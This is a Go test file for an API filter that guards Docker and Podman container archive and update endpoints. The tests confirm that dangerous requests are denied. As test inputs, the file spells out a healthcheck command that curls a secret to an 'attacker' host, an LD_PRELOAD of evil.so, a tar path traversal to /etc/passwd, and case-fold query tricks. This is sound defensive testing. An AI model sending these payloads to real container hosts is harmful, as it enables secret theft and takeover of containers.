package filter

import (
	"archive/tar"
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// libpodArchivePolicyOptions is the posture the archive cases are judged
// against: an operator who allowlisted one target directory and left the
// setuid/device/symlink defaults alone.
func libpodArchivePolicyOptions() ContainerArchiveOptions {
	return ContainerArchiveOptions{AllowedPaths: []string{"/app"}}
}

// libpodUpdateAllGatesOpen is every ContainerUpdateOptions gate set to true.
// Cases using it prove a denial comes from a field with no gate at all rather
// than from a gate the case forgot to open.
func libpodUpdateAllGatesOpen() ContainerUpdateOptions {
	return ContainerUpdateOptions{
		AllowPrivileged:      true,
		AllowAllDevices:      true,
		AllowCapabilities:    true,
		AllowRestartPolicy:   true,
		AllowResourceUpdates: true,
		AllowBlindWrites:     true,
	}
}

// TestContainerSubresourcePath pins the shared dual-spelling predicate the
// archive and update matchers are both built on, including the two facts the
// callers depend on: it reports WHICH spelling matched, and it never matches a
// path that only looks like one (a longer tail, a different subresource, or a
// libpod path that is not under /libpod/containers/).
func TestContainerSubresourcePath(t *testing.T) {
	tests := []struct {
		name        string
		path        string
		subresource string
		wantLibpod  bool
		wantOK      bool
	}{
		{"docker archive", "/containers/abc/archive", "archive", false, true},
		{"libpod archive", "/libpod/containers/abc/archive", "archive", true, true},
		{"docker update", "/containers/abc/update", "update", false, true},
		{"libpod update", "/libpod/containers/abc/update", "update", true, true},
		{"wrong subresource", "/libpod/containers/abc/archive", "update", true, false},
		{"docker path is not a libpod path", "/containers/abc/update", "archive", false, false},
		{"gorilla mux never routes a slashed id", "/libpod/containers/abc/def/archive", "archive", true, false},
		{"no subresource at all", "/libpod/containers/abc", "archive", false, false},
		{"unrelated libpod path", "/libpod/pods/create", "archive", false, false},
		{"unrelated docker path", "/images/create", "archive", false, false},
		{"prefix lookalike", "/containersfoo/abc/archive", "archive", false, false},
		{"libpod prefix lookalike", "/libpod/containersfoo/abc/archive", "archive", false, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			libpod, ok := containerSubresourcePath(tt.path, tt.subresource)
			if ok != tt.wantOK {
				t.Fatalf("containerSubresourcePath(%q, %q) ok = %v, want %v", tt.path, tt.subresource, ok, tt.wantOK)
			}
			if ok && libpod != tt.wantLibpod {
				t.Fatalf("containerSubresourcePath(%q, %q) libpod = %v, want %v", tt.path, tt.subresource, libpod, tt.wantLibpod)
			}
		})
	}
}

// TestLibpodContainerUpdateMatcherIsLibpodOnly asserts the update matchers
// stay mutually exclusive while the archive matcher deliberately spans both
// spellings. The archive exception is the one place a Docker predicate fires
// on a libpod path in this package, so it is pinned here rather than left to
// be discovered by whoever next reads TestLibpodMatchersNeverMatchDockerPathsAndViceVersa.
func TestLibpodContainerUpdateMatcherIsLibpodOnly(t *testing.T) {
	if isContainerUpdatePath("/libpod/containers/abc/update") {
		t.Fatal("isContainerUpdatePath matched the libpod spelling; its body shape is not Docker's")
	}
	if isLibpodContainerUpdatePath("/containers/abc/update") {
		t.Fatal("isLibpodContainerUpdatePath matched the Docker-compat spelling")
	}
	if !isContainerUpdatePath("/containers/abc/update") {
		t.Fatal("isContainerUpdatePath stopped matching its own path")
	}
	if !isLibpodContainerUpdatePath("/libpod/containers/abc/update") {
		t.Fatal("isLibpodContainerUpdatePath does not match its own path")
	}

	// The deliberate exception: one compat.Archive handler in Podman, one
	// predicate here.
	if !isContainerArchivePath("/containers/abc/archive") {
		t.Fatal("isContainerArchivePath stopped matching the Docker-compat spelling")
	}
	if !isContainerArchivePath("/libpod/containers/abc/archive") {
		t.Fatal("isContainerArchivePath does not match the libpod spelling; the copy-into-container gap is open again")
	}
}

// TestLibpodContainerArchiveInspect runs the existing containerArchivePolicy
// against Podman's native PUT /libpod/containers/{name}/archive. Every case is
// paired with its Docker-compat twin so the two are asserted to reach the same
// verdict, which is the whole claim of routing both spellings to one policy.
func TestLibpodContainerArchiveInspect(t *testing.T) {
	safe := mustContainerArchiveTar(t, containerArchiveTestEntry{name: "uploads/file.txt", body: "ok"})
	setuid := mustContainerArchiveTar(t, containerArchiveTestEntry{name: "bin/tool", body: "x", mode: 0o4755})
	escaping := mustContainerArchiveTar(t, containerArchiveTestEntry{name: "../etc/passwd", body: "root"})
	device := mustContainerArchiveTar(t, containerArchiveTestEntry{name: "dev/kvm", typ: tar.TypeChar, mode: 0o600})

	tests := []struct {
		name        string
		query       string
		body        []byte
		wantDeny    bool
		wantReasonC string
	}{
		{
			name:  "allows a clean tar into an allowlisted target",
			query: "?path=/app/uploads",
			body:  safe,
		},
		{
			name:        "denies a target path outside the allowlist",
			query:       "?path=/etc",
			body:        safe,
			wantDeny:    true,
			wantReasonC: "is not allowlisted",
		},
		{
			name:        "denies a traversing target path",
			query:       "?path=../etc",
			body:        safe,
			wantDeny:    true,
			wantReasonC: "must stay within the container path",
		},
		{
			name:        "denies a setuid tar entry",
			query:       "?path=/app",
			body:        setuid,
			wantDeny:    true,
			wantReasonC: "sets setuid/setgid bits",
		},
		{
			name:        "denies a tar entry escaping the archive",
			query:       "?path=/app",
			body:        escaping,
			wantDeny:    true,
			wantReasonC: "must be relative and stay within the archive",
		},
		{
			name:        "denies a device node",
			query:       "?path=/app",
			body:        device,
			wantDeny:    true,
			wantReasonC: "is a device node",
		},
	}

	for _, tt := range tests {
		for _, surface := range []struct {
			name string
			path string
		}{
			{"libpod", "/libpod/containers/abc/archive"},
			{"docker", "/containers/abc/archive"},
		} {
			t.Run(tt.name+"/"+surface.name, func(t *testing.T) {
				req := httptest.NewRequest(http.MethodPut, surface.path+tt.query, bytes.NewReader(tt.body))
				normalized := NormalizePath(req.URL.Path)

				reason, err := newContainerArchivePolicy(libpodArchivePolicyOptions()).inspect(nil, req, normalized)
				if err != nil {
					t.Fatalf("inspect() error = %v", err)
				}
				if tt.wantDeny {
					if reason == "" {
						t.Fatalf("inspect(%q) allowed, want deny", surface.path+tt.query)
					}
					if !strings.Contains(reason, tt.wantReasonC) {
						t.Fatalf("reason = %q, want it to mention %q", reason, tt.wantReasonC)
					}
					return
				}
				if reason != "" {
					t.Fatalf("inspect(%q) denied with %q, want allow", surface.path+tt.query, reason)
				}
			})
		}
	}
}

// TestLibpodContainerArchiveMiddlewareInspects drives the full middleware
// rather than the policy directly, so it fails if the libpod archive path is
// ever dropped from compileRuntimePolicy's inspection table — which is the
// defect this test exists for. The versioned cases prove Podman's /vN.N/
// prefix does not shake the inspector off.
func TestLibpodContainerArchiveMiddlewareInspects(t *testing.T) {
	safe := mustContainerArchiveTar(t, containerArchiveTestEntry{name: "uploads/file.txt", body: "ok"})
	setuid := mustContainerArchiveTar(t, containerArchiveTestEntry{name: "bin/tool", body: "x", mode: 0o4755})

	tests := []struct {
		name       string
		target     string
		body       []byte
		wantStatus int
		wantReason string
	}{
		{
			name:       "denies a setuid tar on the libpod path",
			target:     "/libpod/containers/abc/archive?path=/app",
			body:       setuid,
			wantStatus: http.StatusForbidden,
			wantReason: "sets setuid/setgid bits",
		},
		{
			name:       "denies a setuid tar behind a Podman version prefix",
			target:     "/v5.0.0/libpod/containers/abc/archive?path=/app",
			body:       setuid,
			wantStatus: http.StatusForbidden,
			wantReason: "sets setuid/setgid bits",
		},
		{
			name:       "denies an off-allowlist target on the libpod path",
			target:     "/libpod/containers/abc/archive?path=/etc",
			body:       safe,
			wantStatus: http.StatusForbidden,
			wantReason: "is not allowlisted",
		},
		{
			name:       "allows a clean tar into an allowlisted target on the libpod path",
			target:     "/libpod/containers/abc/archive?path=/app/uploads",
			body:       safe,
			wantStatus: http.StatusCreated,
		},
		{
			name:       "allows a clean tar behind a Podman version prefix",
			target:     "/v5.0.0/libpod/containers/abc/archive?path=/app/uploads",
			body:       safe,
			wantStatus: http.StatusCreated,
		},
		{
			name:       "denies a setuid tar on the Docker-compat path, unchanged",
			target:     "/containers/abc/archive?path=/app",
			body:       setuid,
			wantStatus: http.StatusForbidden,
			wantReason: "sets setuid/setgid bits",
		},
		{
			name:       "allows a clean tar on the Docker-compat path, unchanged",
			target:     "/containers/abc/archive?path=/app/uploads",
			body:       safe,
			wantStatus: http.StatusCreated,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			handler := libpodContainerWriteHandler(t, http.MethodPut, []string{"/containers/*/archive", "/libpod/containers/*/archive"}, PolicyConfig{
				DenyResponseVerbosity: DenyResponseVerbosityVerbose,
				ContainerArchive:      libpodArchivePolicyOptions(),
			})

			req := httptest.NewRequest(http.MethodPut, tt.target, bytes.NewReader(tt.body))
			rec := httptest.NewRecorder()
			handler.ServeHTTP(rec, req)

			assertLibpodWriteOutcome(t, rec, tt.wantStatus, tt.wantReason)
		})
	}
}

// TestLibpodContainerUpdateInspect pins containerUpdatePolicy.inspectLibpod
// against the body and query shape Podman v5.8.1 actually accepts on
// POST /libpod/containers/{name}/update: handlers.UpdateEntities, whose
// embedded specs.LinuxResources, define.UpdateHealthCheckConfig and
// define.UpdateContainerDevicesLimits all flatten to the request root, plus
// the restartPolicy/restartRetries query parameters that carry the restart
// policy instead of the body.
func TestLibpodContainerUpdateInspect(t *testing.T) {
	tests := []struct {
		name        string
		opts        ContainerUpdateOptions
		rawQuery    string
		body        string
		wantDeny    bool
		wantReasonC string
	}{
		{
			name:        "denies the OCI cgroup device allowlist by default",
			body:        `{"devices":[{"allow":true,"type":"c","major":10,"minor":232,"access":"rwm"}]}`,
			wantDeny:    true,
			wantReasonC: "device changes are not allowed",
		},
		{
			name: "allows the device allowlist under allow_all_devices",
			opts: ContainerUpdateOptions{AllowAllDevices: true},
			body: `{"devices":[{"allow":true,"type":"c","major":10,"minor":232,"access":"rwm"}]}`,
		},
		{
			name:        "denies an OCI memory limit by default",
			body:        `{"memory":{"limit":536870912}}`,
			wantDeny:    true,
			wantReasonC: "resource control changes are not allowed",
		},
		{
			name:        "denies an OCI cpu block by default",
			body:        `{"cpu":{"quota":50000,"period":100000}}`,
			wantDeny:    true,
			wantReasonC: "resource control changes are not allowed",
		},
		{
			name:        "denies an OCI pids limit by default",
			body:        `{"pids":{"limit":4096}}`,
			wantDeny:    true,
			wantReasonC: "resource control changes are not allowed",
		},
		{
			// The whole point of reading libpod's shape rather than
			// Docker's: none of these keys exist in
			// containerUpdateResourceControlFields.
			name:        "denies raw cgroup v2 unified writes by default",
			body:        `{"unified":{"memory.oom.group":"1"}}`,
			wantDeny:    true,
			wantReasonC: "resource control changes are not allowed",
		},
		{
			name:        "denies libpod rlimits by default",
			body:        `{"r_limits":[{"type":"RLIMIT_NOFILE","hard":-1,"soft":-1}]}`,
			wantDeny:    true,
			wantReasonC: "resource control changes are not allowed",
		},
		{
			// UpdateContainerDevicesLimits carries no json tags, so the
			// wire keys are the bare Go field names.
			name:        "denies per-device IO throttles by default",
			body:        `{"DeviceReadBPs":[{"Path":"/dev/sda","Rate":1048576}]}`,
			wantDeny:    true,
			wantReasonC: "resource control changes are not allowed",
		},
		{
			name: "allows resource fields under allow_resource_updates",
			opts: ContainerUpdateOptions{AllowResourceUpdates: true},
			body: `{"memory":{"limit":536870912},"cpu":{"shares":512},"pids":{"limit":4096}}`,
		},
		{
			// encoding/json resolves a struct field case-insensitively, so
			// Podman honors the Docker-looking spelling here too.
			name:        "denies the case-variant Memory spelling Podman honors",
			body:        `{"Memory":{"limit":1}}`,
			wantDeny:    true,
			wantReasonC: "resource control changes are not allowed",
		},
		{
			name:        "denies a healthcheck command even with every gate open",
			opts:        libpodUpdateAllGatesOpen(),
			body:        `{"health_cmd":"/bin/sh -c 'curl http://attacker/$(cat /run/secrets/db)'"}`,
			wantDeny:    true,
			wantReasonC: "healthcheck command changes are not allowed",
		},
		{
			name:        "denies a startup healthcheck command even with every gate open",
			opts:        libpodUpdateAllGatesOpen(),
			body:        `{"health_startup_cmd":"/bin/sh -c id"}`,
			wantDeny:    true,
			wantReasonC: "startup healthcheck command changes are not allowed",
		},
		{
			name:        "denies environment changes even with every gate open",
			opts:        libpodUpdateAllGatesOpen(),
			body:        `{"Env":["LD_PRELOAD=/tmp/evil.so"]}`,
			wantDeny:    true,
			wantReasonC: "environment changes are not allowed",
		},
		{
			name:        "denies environment removal even with every gate open",
			opts:        libpodUpdateAllGatesOpen(),
			body:        `{"UnsetEnv":["PATH"]}`,
			wantDeny:    true,
			wantReasonC: "environment changes are not allowed",
		},
		{
			name:        "denies a caller-chosen healthcheck log directory even with every gate open",
			opts:        libpodUpdateAllGatesOpen(),
			body:        `{"health_log_destination":"/var/lib/containers"}`,
			wantDeny:    true,
			wantReasonC: "healthcheck log destination changes are not allowed",
		},
		{
			name:        "denies a healthcheck failure action by default",
			body:        `{"health_on_failure":"restart"}`,
			wantDeny:    true,
			wantReasonC: "healthcheck failure-action changes are not allowed",
		},
		{
			name:        "denies disabling the healthcheck by default",
			body:        `{"no_healthcheck":true}`,
			wantDeny:    true,
			wantReasonC: "healthcheck failure-action changes are not allowed",
		},
		{
			// Podman's own field doc: "the maximum number of retries before
			// the startup healthcheck will restart the container".
			name:        "denies startup healthcheck retries by default",
			body:        `{"health_startup_retries":1}`,
			wantDeny:    true,
			wantReasonC: "healthcheck failure-action changes are not allowed",
		},
		{
			name: "allows the healthcheck failure action under allow_restart_policy",
			opts: ContainerUpdateOptions{AllowRestartPolicy: true},
			body: `{"health_on_failure":"restart","no_healthcheck":false,"health_startup_retries":1}`,
		},
		{
			name:        "denies health interval without blind-write acknowledgement",
			body:        `{"health_interval":"1ns"}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies health retries without blind-write acknowledgement",
			body:        `{"health_retries":3}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies health timeout without blind-write acknowledgement",
			body:        `{"health_timeout":"5s"}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies health start period without blind-write acknowledgement",
			body:        `{"health_start_period":"10s"}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies startup interval without blind-write acknowledgement",
			body:        `{"health_startup_interval":"1ns"}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies startup timeout without blind-write acknowledgement",
			body:        `{"health_startup_timeout":"3s"}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies startup success threshold without blind-write acknowledgement",
			body:        `{"health_startup_success":1}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies infinite health log size without blind-write acknowledgement",
			body:        `{"health_max_log_size":0}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name:        "denies infinite health log count without blind-write acknowledgement",
			body:        `{"health_max_log_count":0}`,
			wantDeny:    true,
			wantReasonC: "insecure_allow_body_blind_writes",
		},
		{
			name: "allows health timing and retention under blind-write acknowledgement",
			opts: ContainerUpdateOptions{AllowBlindWrites: true},
			body: `{"health_interval":"30s","health_retries":3,"health_timeout":"5s","health_start_period":"10s","health_startup_interval":"2s","health_startup_timeout":"3s","health_startup_success":1,"health_max_log_size":0,"health_max_log_count":0}`,
		},
		{
			name:        "denies the restartPolicy query parameter by default",
			rawQuery:    "restartPolicy=always",
			body:        `{}`,
			wantDeny:    true,
			wantReasonC: "restart policy changes are not allowed",
		},
		{
			// gorilla/schema matches the tag with strings.EqualFold, so
			// Podman decodes this into RestartPolicy.
			name:        "denies the case-folded RestartPolicy spelling Podman accepts",
			rawQuery:    "RestartPolicy=always",
			body:        `{}`,
			wantDeny:    true,
			wantReasonC: "restart policy changes are not allowed",
		},
		{
			// U+017F LATIN SMALL LETTER LONG S is in the same Unicode simple-
			// fold orbit as ASCII s. gorilla/schema therefore decodes this
			// percent-encoded spelling into RestartPolicy too.
			name:        "denies the Unicode simple-fold restartPolicy spelling Podman accepts",
			rawQuery:    "re%C5%BFtartPolicy=always",
			body:        `{}`,
			wantDeny:    true,
			wantReasonC: "restart policy changes are not allowed",
		},
		{
			// gorilla/schema takes the LAST value for a scalar; a proxy
			// reading only the first would allow this.
			name:        "denies a repeated restartPolicy whose last value is set",
			rawQuery:    "restartPolicy=&restartPolicy=always",
			body:        `{}`,
			wantDeny:    true,
			wantReasonC: "restart policy changes are not allowed",
		},
		{
			name:        "denies restartRetries on its own",
			rawQuery:    "restartRetries=5",
			body:        `{}`,
			wantDeny:    true,
			wantReasonC: "restart policy changes are not allowed",
		},
		{
			name:     "allows the restartPolicy query under allow_restart_policy",
			opts:     ContainerUpdateOptions{AllowRestartPolicy: true},
			rawQuery: "restartPolicy=always&restartRetries=5",
			body:     `{}`,
		},
		{
			// gorilla/schema fails to parse "" into the handler's uint, so
			// Podman 400s before any update; there is nothing to deny.
			name:     "ignores an empty restartPolicy value",
			rawQuery: "restartPolicy=",
			body:     `{}`,
		},
		{
			name: "allows an empty object",
			body: `{}`,
		},
		{
			// Podman decodes the request root straight into the struct, so
			// a Docker-shaped wrapper is never applied and must not be read.
			name: "ignores a Docker-shaped HostConfig wrapper Podman never applies",
			body: `{"HostConfig":{"Privileged":true,"Memory":1}}`,
		},
		{
			name:        "denies a body it cannot decode",
			body:        `{"memory":`,
			wantDeny:    true,
			wantReasonC: "request body could not be inspected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			target := "/libpod/containers/abc/update"
			if tt.rawQuery != "" {
				target += "?" + tt.rawQuery
			}
			req := httptest.NewRequest(http.MethodPost, target, strings.NewReader(tt.body))

			reason, err := newContainerUpdatePolicy(tt.opts).inspectLibpod(testLogger(), req, NormalizePath(req.URL.Path))
			if err != nil {
				t.Fatalf("inspectLibpod() error = %v", err)
			}
			if tt.wantDeny {
				if reason == "" {
					t.Fatalf("inspectLibpod(%q, %q) allowed, want deny", tt.rawQuery, tt.body)
				}
				if !strings.Contains(reason, tt.wantReasonC) {
					t.Fatalf("reason = %q, want it to mention %q", reason, tt.wantReasonC)
				}
				return
			}
			if reason != "" {
				t.Fatalf("inspectLibpod(%q, %q) denied with %q, want allow", tt.rawQuery, tt.body, reason)
			}
		})
	}
}

// TestLibpodContainerUpdateInspectIsPathExclusive asserts the two update
// inspectors never fire on each other's path. Body-shape confusion between
// the families is the #1 risk the libpod split guards against (see
// TestInspectorRoutingIsPathExclusive), and update is the endpoint where the
// two shapes overlap least: reading one body with the other's field list is
// how this endpoint went uninspected in the first place.
func TestLibpodContainerUpdateInspectIsPathExclusive(t *testing.T) {
	policy := newContainerUpdatePolicy(ContainerUpdateOptions{})

	t.Run("libpod inspector ignores the Docker-compat path", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/containers/abc/update?restartPolicy=always", strings.NewReader(`{"memory":{"limit":1}}`))
		reason, err := policy.inspectLibpod(testLogger(), req, "/containers/abc/update")
		if err != nil || reason != "" {
			t.Fatalf("inspectLibpod() = (%q, %v), want (\"\", nil)", reason, err)
		}
	})

	t.Run("Docker inspector ignores the libpod path", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/libpod/containers/abc/update", strings.NewReader(`{"Memory":1,"Privileged":true}`))
		reason, err := policy.inspect(testLogger(), req, "/libpod/containers/abc/update")
		if err != nil || reason != "" {
			t.Fatalf("inspect() = (%q, %v), want (\"\", nil)", reason, err)
		}
	})

	t.Run("libpod inspector ignores a nil request", func(t *testing.T) {
		reason, err := policy.inspectLibpod(testLogger(), nil, "/libpod/containers/abc/update")
		if err != nil || reason != "" {
			t.Fatalf("inspectLibpod(nil) = (%q, %v), want (\"\", nil)", reason, err)
		}
	})

	t.Run("libpod inspector ignores a non-POST method", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/libpod/containers/abc/update?restartPolicy=always", nil)
		reason, err := policy.inspectLibpod(testLogger(), req, "/libpod/containers/abc/update")
		if err != nil || reason != "" {
			t.Fatalf("inspectLibpod() = (%q, %v), want (\"\", nil)", reason, err)
		}
	})
}

// TestLibpodContainerUpdateMiddlewareInspects drives the full middleware so it
// fails if the libpod update path is ever dropped from compileRuntimePolicy's
// inspection table, and pins that the libpod path reads the SAME
// request_body.container_update config as the Docker-compat one.
func TestLibpodContainerUpdateMiddlewareInspects(t *testing.T) {
	tests := []struct {
		name       string
		target     string
		body       string
		policy     ContainerUpdateOptions
		wantStatus int
		wantReason string
	}{
		{
			name:       "denies an OCI memory limit on the libpod path",
			target:     "/libpod/containers/abc/update",
			body:       `{"memory":{"limit":1}}`,
			wantStatus: http.StatusForbidden,
			wantReason: "resource control changes are not allowed",
		},
		{
			name:       "denies an OCI memory limit behind a Podman version prefix",
			target:     "/v5.0.0/libpod/containers/abc/update",
			body:       `{"memory":{"limit":1}}`,
			wantStatus: http.StatusForbidden,
			wantReason: "resource control changes are not allowed",
		},
		{
			name:       "denies a healthcheck command on the libpod path with every gate open",
			target:     "/libpod/containers/abc/update",
			body:       `{"health_cmd":"/bin/sh -c id"}`,
			policy:     libpodUpdateAllGatesOpen(),
			wantStatus: http.StatusForbidden,
			wantReason: "healthcheck command changes are not allowed",
		},
		{
			name:       "denies the restartPolicy query on the libpod path",
			target:     "/libpod/containers/abc/update?restartPolicy=always",
			body:       `{}`,
			wantStatus: http.StatusForbidden,
			wantReason: "restart policy changes are not allowed",
		},
		{
			name:       "denies healthcheck timing tuning without blind-write acknowledgement",
			target:     "/libpod/containers/abc/update",
			body:       `{"health_interval":"1ns"}`,
			wantStatus: http.StatusForbidden,
			wantReason: "insecure_allow_body_blind_writes",
		},
		{
			name:       "allows healthcheck timing tuning under blind-write acknowledgement",
			target:     "/libpod/containers/abc/update",
			body:       `{"health_interval":"30s"}`,
			policy:     ContainerUpdateOptions{AllowBlindWrites: true},
			wantStatus: http.StatusCreated,
		},
		{
			name:       "allows resource fields on the libpod path under allow_resource_updates",
			target:     "/v5.0.0/libpod/containers/abc/update",
			body:       `{"memory":{"limit":1}}`,
			policy:     ContainerUpdateOptions{AllowResourceUpdates: true},
			wantStatus: http.StatusCreated,
		},
		{
			name:       "denies a Docker-shaped resource change on the Docker-compat path, unchanged",
			target:     "/containers/abc/update",
			body:       `{"Memory":1}`,
			wantStatus: http.StatusForbidden,
			wantReason: "resource control changes are not allowed",
		},
		{
			name:       "allows an empty Docker-compat update, unchanged",
			target:     "/containers/abc/update",
			body:       `{}`,
			wantStatus: http.StatusCreated,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			handler := libpodContainerWriteHandler(t, http.MethodPost, []string{"/containers/*/update", "/libpod/containers/*/update"}, PolicyConfig{
				DenyResponseVerbosity: DenyResponseVerbosityVerbose,
				ContainerUpdate:       tt.policy,
			})

			req := httptest.NewRequest(http.MethodPost, tt.target, strings.NewReader(tt.body))
			rec := httptest.NewRecorder()
			handler.ServeHTTP(rec, req)

			assertLibpodWriteOutcome(t, rec, tt.wantStatus, tt.wantReason)
		})
	}
}

// libpodContainerWriteHandler builds the production filter chain with allow
// rules for the given patterns and a deny-all fallthrough, wrapping a stub
// upstream that 201s. It exists so the archive and update middleware tables
// above assemble their handler identically.
func libpodContainerWriteHandler(t *testing.T, method string, patterns []string, policy PolicyConfig) http.Handler {
	t.Helper()

	rules := make([]*CompiledRule, 0, len(patterns)+1)
	for i, pattern := range patterns {
		rule, err := CompileRule(Rule{Methods: []string{method}, Pattern: pattern, Action: ActionAllow, Index: i})
		if err != nil {
			t.Fatalf("CompileRule(%q) error = %v", pattern, err)
		}
		rules = append(rules, rule)
	}
	denyAll, err := CompileRule(Rule{Methods: []string{"*"}, Pattern: "/**", Action: ActionDeny, Reason: "deny all", Index: len(patterns)})
	if err != nil {
		t.Fatalf("CompileRule(deny all) error = %v", err)
	}
	rules = append(rules, denyAll)

	return MiddlewareWithOptions(rules, testLogger(), Options{PolicyConfig: policy})(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusCreated)
	}))
}

func assertLibpodWriteOutcome(t *testing.T, rec *httptest.ResponseRecorder, wantStatus int, wantReason string) {
	t.Helper()

	if rec.Code != wantStatus {
		t.Fatalf("status = %d, want %d; body: %s", rec.Code, wantStatus, rec.Body.String())
	}
	if wantReason == "" {
		return
	}
	var body DenialResponse
	if err := json.NewDecoder(rec.Body).Decode(&body); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if !strings.Contains(body.Reason, wantReason) {
		t.Fatalf("reason = %q, want it to mention %q", body.Reason, wantReason)
	}
}
